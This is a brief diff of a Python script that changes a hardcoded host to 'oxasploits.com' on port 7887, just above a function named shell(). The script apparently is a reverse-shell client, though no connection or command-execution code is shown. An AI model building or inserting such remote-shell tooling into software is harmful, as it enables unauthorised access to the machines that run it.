@@ -4,7 +4,7 @@ import subprocess
 import time
 import sys
 
-host = '01.dev.oxasploits.com'
+host = 'oxasploits.com'
 port = 7887
 
 def shell():
